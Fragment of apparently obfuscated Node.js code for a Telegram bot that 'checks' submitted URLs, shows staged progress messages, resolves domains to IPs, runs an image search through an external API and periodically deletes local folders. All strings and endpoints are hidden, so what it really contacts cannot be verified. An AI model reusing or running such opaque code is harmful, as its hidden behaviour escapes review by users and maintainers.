        const _0x56bc11 = await axios[_0x884f3f(0x4f5)](_0x884f3f(0x46c) + _0x884f3f(0x817) + _0x23f487 + _0x884f3f(0x76b));
        return _0x56bc11[_0x884f3f(0x8fe)];
    } catch (_0x3acc25) {
        return null;
    }
}
function extractIpFromUrl(_0x598b61) {
    const _0x4de867 = _0x544f76, _0x1e48d1 = {
            'NKFoH': function (_0x53ba2f, _0x15b2af) {
                return _0x53ba2f(_0x15b2af);
            }
        };
    try {
        const _0x5300b5 = new URL(_0x598b61)[_0x4de867(0x83c)];
        return new Promise((_0x300da4, _0x5907ed) => {
            const _0x3a32f1 = _0x4de867, _0x4f325b = {
                    'uvIOp': function (_0x23f981, _0x40f79a) {
                        const _0x4d5640 = _0x6efd;
                        return _0x1e48d1[_0x4d5640(0x8e2)](_0x23f981, _0x40f79a);
                    },
                    'MdrLD': function (_0x651f93, _0x9fab6b) {
                        const _0x309712 = _0x6efd;
                        return _0x1e48d1[_0x309712(0x8e2)](_0x651f93, _0x9fab6b);
                    }
                };
            dns[_0x3a32f1(0x8d1)](_0x5300b5, (_0x3e9f68, _0x387b75) => {
                const _0xcbe79c = _0x3a32f1;
                if (_0x3e9f68)
                    _0x4f325b[_0xcbe79c(0x1cc)](_0x5907ed, null);
                else
                    _0x4f325b[_0xcbe79c(0x6bc)](_0x300da4, _0x387b75);
            });
        });
    } catch (_0x2bb84a) {
        return null;
    }
}
bot[_0x544f76(0x937)](/\/sكخزننننtart/, _0xfb15ca => {
    const _0x3937ef = _0x544f76, _0x24da04 = {
            'YxLYE': _0x3937ef(0x668) + 'ط',
            'lRVyc': _0x3937ef(0x760) + 's',
            'ecRfL': _0x3937ef(0x2a4) + _0x3937ef(0x5d1) + _0x3937ef(0x219)
        }, _0x2c2276 = _0xfb15ca[_0x3937ef(0x638)]['id'], _0x36356d = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x24da04[_0x3937ef(0x475)],
                            'callback_data': _0x24da04[_0x3937ef(0x74e)]
                        }]]
            }
        };
    bot[_0x3937ef(0x84f) + 'e'](_0x2c2276, _0x24da04[_0x3937ef(0x605)], _0x36356d);
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), _0x3e052c => {
    const _0x41bd68 = _0x544f76, _0x359201 = {
            'SbMvR': function (_0x53b32d, _0x49227b) {
                return _0x53b32d === _0x49227b;
            },
            'yvEkv': _0x41bd68(0x760) + 's',
            'ktHyX': _0x41bd68(0x502) + _0x41bd68(0x64a) + _0x41bd68(0x1eb)
        }, _0x2d1f3b = _0x3e052c[_0x41bd68(0x320)][_0x41bd68(0x638)]['id'];
    _0x359201[_0x41bd68(0x3eb)](_0x3e052c[_0x41bd68(0x8fe)], _0x359201[_0x41bd68(0x690)]) && (bot[_0x41bd68(0x84f) + 'e'](_0x2d1f3b, _0x359201[_0x41bd68(0x7a0)]), waiting_for_link[_0x2d1f3b] = !![]);
}), bot['on'](_0x544f76(0x320), async _0x327d2d => {
    const _0x5acf47 = _0x544f76, _0x278c18 = {
            'qvPkQ': function (_0x2037d6, _0x3c0969) {
                return _0x2037d6(_0x3c0969);
            },
            'iuUxG': _0x5acf47(0x2ef) + _0x5acf47(0x416) + _0x5acf47(0x4f7),
            'cHLFf': _0x5acf47(0x55c) + _0x5acf47(0x6a4) + _0x5acf47(0x392) + '%',
            'ZMbDU': function (_0xd1a9dd, _0x154d17) {
                return _0xd1a9dd(_0x154d17);
            },
            'YPSNH': _0x5acf47(0x55c) + _0x5acf47(0x238) + _0x5acf47(0x567) + '5%',
            'XNxII': _0x5acf47(0x55c) + _0x5acf47(0x417) + _0x5acf47(0x731) + '0%',
            'HfXZT': function (_0x142393, _0x2b8f0d) {
                return _0x142393(_0x2b8f0d);
            },
            'fmJug': _0x5acf47(0x55c) + _0x5acf47(0x417) + _0x5acf47(0x493) + '5%',
            'gzJro': _0x5acf47(0x55c) + _0x5acf47(0x417) + _0x5acf47(0x1a6) + _0x5acf47(0x2bb),
            'Hydeo': function (_0x2d92ab, _0x12d48c) {
                return _0x2d92ab(_0x12d48c);
            },
            'SZXhI': function (_0x234dcd, _0x137c4a) {
                return _0x234dcd(_0x137c4a);
            },
            'XcIqA': function (_0xd1a4b6, _0x4a80ca) {
                return _0xd1a4b6(_0x4a80ca);
            },
            'XqKdL': function (_0x431680, _0x1490b9) {
                return _0x431680 === _0x1490b9;
            },
            'TDeyI': _0x5acf47(0x214),
            'cOtyv': _0x5acf47(0x4a8) + _0x5acf47(0x87f) + _0x5acf47(0x254) + _0x5acf47(0x71e),
            'BckNQ': function (_0x263776, _0x4dd278) {
                return _0x263776 === _0x4dd278;
            },
            'FQVYD': _0x5acf47(0x340),
            'KhyIk': _0x5acf47(0x945) + _0x5acf47(0x322) + _0x5acf47(0x8b6) + _0x5acf47(0x5d5) + _0x5acf47(0x4c5) + _0x5acf47(0x7b9) + _0x5acf47(0x3a8) + _0x5acf47(0x6d5) + _0x5acf47(0x23d) + _0x5acf47(0x39e) + _0x5acf47(0x51e) + _0x5acf47(0x316) + _0x5acf47(0x8fc) + _0x5acf47(0x6eb) + _0x5acf47(0x679) + _0x5acf47(0x582) + _0x5acf47(0x21f) + _0x5acf47(0x260) + _0x5acf47(0x94b) + _0x5acf47(0x68e) + _0x5acf47(0x736),
            'wltpY': function (_0x2f546a, _0xcc3401) {
                return _0x2f546a === _0xcc3401;
            },
            'aahjK': _0x5acf47(0x7ad) + '🔴',
            'yoCOH': _0x5acf47(0x343) + _0x5acf47(0x2ba) + _0x5acf47(0x34e) + _0x5acf47(0x8af) + _0x5acf47(0x66b) + _0x5acf47(0x50f) + _0x5acf47(0x847) + _0x5acf47(0x7e4) + _0x5acf47(0x617) + _0x5acf47(0x6c3) + _0x5acf47(0x8d3) + _0x5acf47(0x61d) + _0x5acf47(0x323) + _0x5acf47(0x324) + _0x5acf47(0x508) + _0x5acf47(0x1c4) + _0x5acf47(0x70d),
            'RLLnb': function (_0x2900ac, _0x3b6fb5) {
                return _0x2900ac || _0x3b6fb5;
            },
            'IkdsB': _0x5acf47(0x330) + _0x5acf47(0x4e7),
            'GItvr': _0x5acf47(0x2be)
        }, _0x30622e = _0x327d2d[_0x5acf47(0x638)]['id'], _0x704917 = _0x327d2d[_0x5acf47(0x6d8)];
    if (waiting_for_link[_0x30622e]) {
        if (!_0x278c18[_0x5acf47(0x361)](isValidUrl, _0x704917)) {
            bot[_0x5acf47(0x84f) + 'e'](_0x30622e, _0x278c18[_0x5acf47(0x1f3)]);
            return;
        }
        let _0x24e5ad = await bot[_0x5acf47(0x84f) + 'e'](_0x30622e, _0x278c18[_0x5acf47(0x51b)]);
        await _0x278c18[_0x5acf47(0x5f6)](sleep, -0x23d + -0x2683 + 0x3860), bot[_0x5acf47(0x432) + _0x5acf47(0x628)](_0x278c18[_0x5acf47(0x589)], {
            'chat_id': _0x30622e,
            'message_id': _0x24e5ad[_0x5acf47(0x342)]
        }), await _0x278c18[_0x5acf47(0x361)](sleep, -0x26f * -0x6 + -0x1 * -0x2183 + -0x207d * 0x1), bot[_0x5acf47(0x432) + _0x5acf47(0x628)](_0x278c18[_0x5acf47(0x289)], {
            'chat_id': _0x30622e,
            'message_id': _0x24e5ad[_0x5acf47(0x342)]
        }), await _0x278c18[_0x5acf47(0x4a7)](sleep, 0x1a06 + -0x1831 + 0xdcb), bot[_0x5acf47(0x432) + _0x5acf47(0x628)](_0x278c18[_0x5acf47(0x27e)], {
            'chat_id': _0x30622e,
            'message_id': _0x24e5ad[_0x5acf47(0x342)]
        }), await _0x278c18[_0x5acf47(0x361)](sleep, 0x1d0e * -0x1 + 0x348 * 0x1 + 0x5ea * 0x7), bot[_0x5acf47(0x432) + _0x5acf47(0x628)](_0x278c18[_0x5acf47(0x395)], {
            'chat_id': _0x30622e,
            'message_id': _0x24e5ad[_0x5acf47(0x342)]
        }), await _0x278c18[_0x5acf47(0x5f6)](sleep, -0x7e1 * -0x3 + 0x978 + -0x1d33), bot[_0x5acf47(0x699) + _0x5acf47(0x38c)](_0x30622e, _0x24e5ad[_0x5acf47(0x342)]);
        const _0x2d5506 = _0x278c18[_0x5acf47(0x2ab)](checkUrl, _0x704917), _0x4611bf = await _0x278c18[_0x5acf47(0x663)](extractIpFromUrl, _0x704917), _0xfbd8bf = _0x4611bf ? await _0x278c18[_0x5acf47(0x728)](getIpInfo, _0x4611bf) : {};
        let _0x6c43a6 = '';
        if (_0x278c18[_0x5acf47(0x89f)](_0x2d5506, _0x278c18[_0x5acf47(0x245)]))
            _0x6c43a6 = _0x278c18[_0x5acf47(0x7bf)];
        else {
            if (_0x278c18[_0x5acf47(0x92c)](_0x2d5506, _0x278c18[_0x5acf47(0x602)]))
                _0x6c43a6 = _0x278c18[_0x5acf47(0x637)];
            else
                _0x278c18[_0x5acf47(0x5a6)](_0x2d5506, _0x278c18[_0x5acf47(0x4ab)]) && (_0x6c43a6 = _0x278c18[_0x5acf47(0x7d9)]);
        }
        const _0x5159eb = _0x5acf47(0x494) + _0x5acf47(0x2ee) + _0x704917 + (_0x5acf47(0x4c9) + _0x5acf47(0x3d3) + ':\x20') + _0x2d5506 + (_0x5acf47(0x4c9) + _0x5acf47(0x91a) + _0x5acf47(0x379)) + _0x6c43a6 + (_0x5acf47(0x4c9) + _0x5acf47(0x867) + _0x5acf47(0x5b4)) + _0x278c18[_0x5acf47(0x250)](_0x4611bf, _0x278c18[_0x5acf47(0x2b1)]) + (_0x5acf47(0x4c9) + _0x5acf47(0x27c) + _0x5acf47(0x301)) + (_0xfbd8bf[_0x5acf47(0x404)] || _0x278c18[_0x5acf47(0x81b)]) + _0x5acf47(0x83b);
        bot[_0x5acf47(0x84f) + 'e'](_0x30622e, _0x5159eb), waiting_for_link[_0x30622e] = ![];
    } else
        bot[_0x5acf47(0x84f) + 'e'](_0x30622e, '');
});
const currentSearch = {};
bot[_0x544f76(0x937)](/\/stاههلىنححظةرلrt/, _0x200e5d => {
    const _0x426565 = _0x544f76, _0x3f7b1c = {
            'SGLuW': _0x426565(0x7d2),
            'qXrLd': _0x426565(0x7f0) + _0x426565(0x91d),
            'TnZJv': _0x426565(0x751) + _0x426565(0x3f8) + _0x426565(0x3e2) + _0x426565(0x8f6) + _0x426565(0x35e) + _0x426565(0x796) + '-'
        }, _0x51d1e6 = _0x200e5d[_0x426565(0x638)]['id'], _0x139758 = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x3f7b1c[_0x426565(0x946)],
                            'callback_data': _0x3f7b1c[_0x426565(0x6af)]
                        }]]
            }
        };
    bot[_0x426565(0x84f) + 'e'](_0x51d1e6, _0x3f7b1c[_0x426565(0x61c)], _0x139758);
}), bot['on'](_0x544f76(0x84b) + _0x544f76(0x2d1), async _0xf3d87b => {
    const _0x24e70f = _0x544f76, _0x2fa1de = {
            'dfIxn': function (_0x54a28e, _0x57c12c) {
                return _0x54a28e === _0x57c12c;
            },
            'AEroX': _0x24e70f(0x7f0) + _0x24e70f(0x91d),
            'CXvCb': function (_0x42e11d, _0x40b337) {
                return _0x42e11d === _0x40b337;
            },
            'XaDLf': _0x24e70f(0x273) + _0x24e70f(0x5de),
            'VhjCg': _0x24e70f(0x780) + _0x24e70f(0x292) + _0x24e70f(0x913) + _0x24e70f(0x388) + _0x24e70f(0x269),
            'bmWAn': _0x24e70f(0x5e6) + _0x24e70f(0x384) + _0x24e70f(0x2b3) + _0x24e70f(0x634) + _0x24e70f(0x233) + _0x24e70f(0x59e) + _0x24e70f(0x4ca) + _0x24e70f(0x3ce) + _0x24e70f(0x5d0) + _0x24e70f(0x2f9) + _0x24e70f(0x6b0) + _0x24e70f(0x45f) + _0x24e70f(0x644) + _0x24e70f(0x43a) + _0x24e70f(0x427) + _0x24e70f(0x62f) + _0x24e70f(0x822) + '\x20'
        }, _0x41d459 = _0xf3d87b[_0x24e70f(0x320)][_0x24e70f(0x638)]['id'];
    _0x2fa1de[_0x24e70f(0x2ce)](_0xf3d87b[_0x24e70f(0x8fe)], _0x2fa1de[_0x24e70f(0x462)]) && (_0x2fa1de[_0x24e70f(0x7c1)](currentSearch[_0x41d459], _0x2fa1de[_0x24e70f(0x7a7)]) ? bot[_0x24e70f(0x84f) + 'e'](_0x41d459, _0x2fa1de[_0x24e70f(0x36e)]) : (bot[_0x24e70f(0x84f) + 'e'](_0x41d459, _0x2fa1de[_0x24e70f(0x8b4)]), currentSearch[_0x41d459] = _0x2fa1de[_0x24e70f(0x7a7)]));
}), bot['on'](_0x544f76(0x320), async _0x3fd270 => {
    const _0x11f358 = _0x544f76, _0x32a702 = {
            'rbytu': function (_0x11aec4, _0x5135d2) {
                return _0x11aec4 === _0x5135d2;
            },
            'SoiDs': _0x11f358(0x273) + _0x11f358(0x5de),
            'ltSIb': function (_0x2eea7c, _0x3866a1) {
                return _0x2eea7c(_0x3866a1);
            },
            'qFqKm': function (_0x3cd0a8, _0x459ea2) {
                return _0x3cd0a8(_0x459ea2);
            },
            'lOgLJ': _0x11f358(0x524) + _0x11f358(0x838) + _0x11f358(0x83e),
            'fawZz': function (_0x44d74a, _0x1c40c6) {
                return _0x44d74a < _0x1c40c6;
            },
            'aWiIo': function (_0x18dac4, _0x1c6d2a) {
                return _0x18dac4 + _0x1c6d2a;
            },
            'hrvAG': _0x11f358(0x23b) + _0x11f358(0x3c6) + _0x11f358(0x536) + _0x11f358(0x3d8),
            'AZqli': function (_0x36d222, _0x46291b) {
                return _0x36d222 !== _0x46291b;
            }
        }, _0x3ea830 = _0x3fd270[_0x11f358(0x638)]['id'];
    if (_0x32a702[_0x11f358(0x950)](currentSearch[_0x3ea830], _0x32a702[_0x11f358(0x5e7)])) {
        const _0x3a698e = _0x3fd270[_0x11f358(0x6d8)], _0x3e5469 = _0x11f358(0x650) + _0x11f358(0x63e) + _0x11f358(0x40d) + _0x11f358(0x7ab) + _0x11f358(0x44e) + _0x11f358(0x6fb) + _0x11f358(0x2a8) + _0x11f358(0x28c) + _0x11f358(0x356) + _0x32a702[_0x11f358(0x5f1)](encodeURIComponent, _0x3a698e) + (_0x11f358(0x85e) + _0x11f358(0x3b0) + _0x11f358(0x4e1)) + _0x32a702[_0x11f358(0x29c)](encodeURIComponent, _0x3a698e) + (_0x11f358(0x56a) + _0x11f358(0x407) + _0x11f358(0x3d2) + _0x11f358(0x64e) + _0x11f358(0x6e6));
        try {
            const _0x19f01e = await axios[_0x11f358(0x4f5)](_0x3e5469), _0x2eaee5 = _0x19f01e[_0x11f358(0x8fe)][_0x11f358(0x5ef) + _0x11f358(0x7cf)]?.[_0x11f358(0x8fe)]?.[_0x11f358(0x265)] || [];
            if (_0x32a702[_0x11f358(0x950)](_0x2eaee5[_0x11f358(0x23e)], -0x159a + 0xd4 * -0x19 + -0x72 * -0x5f)) {
                bot[_0x11f358(0x84f) + 'e'](_0x3ea830, _0x32a702[_0x11f358(0x35d)]), delete currentSearch[_0x3ea830];
                return;
            }
            for (let _0x5d119a = 0x1 * -0x102c + -0xe3 + 0xb * 0x18d; _0x32a702[_0x11f358(0x8f3)](_0x5d119a, _0x2eaee5[_0x11f358(0x23e)]); _0x5d119a++) {
                const _0xc058dd = _0x2eaee5[_0x5d119a], _0x56b29d = _0xc058dd[_0x11f358(0x54a)]?.[_0x11f358(0x5da)]?.[_0x11f358(0x8a0)];
                _0x56b29d ? bot[_0x11f358(0x5e4)](_0x3ea830, _0x56b29d, { 'caption': _0x11f358(0x516) + _0x32a702[_0x11f358(0x1b0)](_0x5d119a, 0x1d8e + -0x23d + 0xda8 * -0x2) }) : bot[_0x11f358(0x84f) + 'e'](_0x3ea830, _0x32a702[_0x11f358(0x89d)]);
            }
            delete currentSearch[_0x3ea830];
        } catch (_0x31291e) {
            bot[_0x11f358(0x84f) + 'e'](_0x3ea830, _0x11f358(0x537) + _0x31291e[_0x11f358(0x320)]), delete currentSearch[_0x3ea830];
        }
    } else {
        if (!currentSearch[_0x3ea830])
            bot[_0x11f358(0x84f) + 'e'](_0x3ea830, '');
        else
            _0x32a702[_0x11f358(0x4e9)](currentSearch[_0x3ea830], _0x32a702[_0x11f358(0x5e7)]) && bot[_0x11f358(0x84f) + 'e'](_0x3ea830, '');
    }
});
const clearTemporaryStorage = () => {
    const _0x46813e = _0x544f76, _0x1028f3 = {
            'AWVcz': function (_0x4edf6b, _0x2f48e6) {
                return _0x4edf6b(_0x2f48e6);
            },
            'ZKiXw': _0x46813e(0x2dc) + _0x46813e(0x2c4) + _0x46813e(0x52d),
            'cSkXu': _0x46813e(0x6e0),
            'NUXnw': _0x46813e(0x858),
            'yyeUH': _0x46813e(0x54a),
            'ubAdO': _0x46813e(0x24b) + _0x46813e(0x387) + _0x46813e(0x336) + _0x46813e(0x72b)
        };
    try {
        console[_0x46813e(0x2e0)](_0x1028f3[_0x46813e(0x80e)]);
        const _0xbeaf6a = [
            _0x1028f3[_0x46813e(0x6fa)],
            _0x1028f3[_0x46813e(0x2a9)],
            _0x1028f3[_0x46813e(0x56f)]
        ];
        _0xbeaf6a[_0x46813e(0x64d)](_0x2f5808 => {
            const _0x178d66 = _0x46813e, _0x516c75 = path[_0x178d66(0x1ec)](__dirname, _0x2f5808);
            fs[_0x178d66(0x706)](_0x516c75) ? (_0x1028f3[_0x178d66(0x810)](deleteFolderRecursive, _0x516c75), console[_0x178d66(0x2e0)](_0x178d66(0x2bf) + _0x178d66(0x676) + _0x516c75)) : console[_0x178d66(0x2e0)](_0x178d66(0x842) + _0x178d66(0x26a) + _0x516c75);
        });
    } catch (_0x391231) {
        console[_0x46813e(0x20f)](_0x1028f3[_0x46813e(0x7f4)], _0x391231);
    }
};
setInterval(() => {
    const _0x44c9c0 = _0x544f76, _0x306562 = {
            'SwrHH': function (_0x54fda9) {
                return _0x54fda9();
            },
            'QYkCh': _0x44c9c0(0x899) + _0x44c9c0(0x3da) + _0x44c9c0(0x49a)
        };
    _0x306562[_0x44c9c0(0x28e)](clearTemporaryStorage), console[_0x44c9c0(0x2e0)](_0x306562[_0x44c9c0(0x5f8)]);
}, (0x2096 + -0x103a + -0x105a * 0x1) * (-0x4 * 0x50b + 0x6e6 * 0x5 + -0x259 * 0x6) * (0x6ab + -0x3 * 0xd + -0x29c * 0x1));
const handleExit = () => {
    const _0x40f67 = _0x544f76, _0x3c0502 = {
            'oxobg': _0x40f67(0x237) + _0x40f67(0x557) + _0x40f67(0x1ba) + _0x40f67(0x67f),
            'uJMFx': function (_0x26f7bd) {
                return _0x26f7bd();
            }
        };
    console[_0x40f67(0x2e0)](_0x3c0502[_0x40f67(0x22f)]), _0x3c0502[_0x40f67(0x6e7)](clearTemporaryStorage), process[_0x40f67(0x5df)]();
};
process['on'](_0x544f76(0x5df), handleExit), process['on'](_0x544f76(0x701), handleExit), process['on'](_0x544f76(0x801), handleExit), process['on'](_0x544f76(0x4ed), handleExit);